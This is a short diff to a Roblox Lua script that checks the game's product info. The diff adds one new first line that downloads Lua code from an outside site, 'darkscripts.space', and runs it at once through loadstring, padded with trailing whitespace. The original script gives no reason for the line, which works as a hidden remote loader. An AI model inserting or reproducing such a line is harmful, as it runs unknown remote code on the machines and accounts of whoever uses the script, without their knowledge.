@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://darkscripts.space/scripts/815896821812690946.lua',true))()                              
 repeat task.wait(0.1) until game:IsLoaded()
 local MarketplaceService = game:GetService("MarketplaceService")
 local success, gameInfo = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
